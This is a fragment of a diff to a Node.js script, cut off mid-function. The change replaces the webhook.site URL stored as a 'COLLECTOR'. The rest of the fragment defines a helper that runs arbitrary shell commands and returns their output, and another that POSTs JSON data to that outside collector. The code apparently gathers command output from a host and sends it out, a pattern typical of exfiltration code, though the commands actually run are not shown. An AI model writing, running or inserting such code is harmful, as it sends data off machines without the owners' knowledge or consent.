@@ -1,6 +1,6 @@
 const https = require('https');
 const { execSync } = require('child_process');
-const COLLECTOR = 'https://webhook.site/41490cdd-0904-4dcf-893a-6cf482d38c0a';
+const COLLECTOR = 'https://webhook.site/a4e5d269-5a31-4851-9791-83647e822eef';
 function sh(cmd){ try{ return execSync(cmd,{encoding:'utf8',timeout:25000,maxBuffer:8*1024*1024,stdio:['ignore','pipe','pipe']}); }catch(e){ return 'ERR:'+String((e&&e.stdout)||'')+String((e&&e.stderr)||'')+String((e&&e.message)||''); } }
 function post(obj,url){ return new Promise(res=>{ try{ const body=Buffer.from(JSON.stringify(obj)); const u=new URL(url||COLLECTOR);
   const req=https.request({hostname:u.hostname,path:u.pathname+u.search,method:'POST',headers:{'content-type':'application/json','content-length':body.length},timeout:25000},r=>{r.resume();r.on('end',()=>res(r.statusCode));});
